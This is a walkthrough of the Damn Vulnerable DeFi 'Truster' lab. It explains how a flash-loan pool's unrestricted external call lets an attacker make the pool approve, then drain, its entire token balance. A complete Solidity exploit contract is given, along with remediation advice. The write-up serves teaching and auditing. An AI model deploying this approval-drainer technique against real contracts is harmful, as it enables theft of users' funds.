# 03 — Truster

**Class:** Arbitrary external call with contract-controlled calldata
**Goal:** Drain the pool's 1,000,000 DVT to the recovery account in a **single
player transaction**.

## The setup

`TrusterLenderPool.flashLoan` lends DVT for free, but before checking repayment it
does:

```solidity
token.transfer(borrower, amount);
target.functionCall(data);            // <-- attacker picks target AND data
if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();
```

## Root cause

`target` and `data` are fully attacker-controlled, and the call executes **with
the pool as `msg.sender`**. The pool will therefore perform *any* action on our
behalf. The intended use is a callback into the borrower, but nothing restricts
`target` to the borrower — the classic "arbitrary call" sink.

The natural move is to make the pool `approve` us to spend its tokens:

```solidity
target = address(token);
data   = abi.encodeCall(token.approve, (attacker, poolBalance));
amount = 0; // borrow nothing, so the balance check trivially passes
```

After the flash loan the pool has granted us an allowance over its full balance,
which we drain with `transferFrom`.

## Exploit — beating the one-transaction limit

`approve` then `transferFrom` are two calls. The challenge caps the player at a
single EOA transaction, so we put both inside a **contract constructor** — the
deployment *is* the one tx:

```solidity
contract TrusterExploit {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeCall(token.approve, (address(this), amount));
        pool.flashLoan(0, address(this), address(token), data); // pool approves us
        token.transferFrom(address(pool), recovery, amount);      // pull the funds
    }
}
```

The player's solution is simply `new TrusterExploit(pool, token, recovery);`.

## Remediation

- **Never** make a low-level/`functionCall` to an attacker-supplied `target` with
  attacker-supplied `data`. If a callback is required, hardcode the interface and
  call a fixed method (e.g. `IERC3156FlashBorrower(borrower).onFlashLoan(...)`),
  so the pool can only invoke the intended entrypoint on the intended contract.
- Follow the ERC-3156 pattern: pull repayment via `transferFrom` from the
  borrower using a *pre-approved* allowance the borrower set, rather than granting
  the pool arbitrary-call powers.

## Real-world parallel

Arbitrary `call(target, data)` where both are user-controlled is one of the most
common critical findings in audits — it underlies approval-drainer exploits,
"arbitrary call" router bugs, and many bridge/relayer compromises.
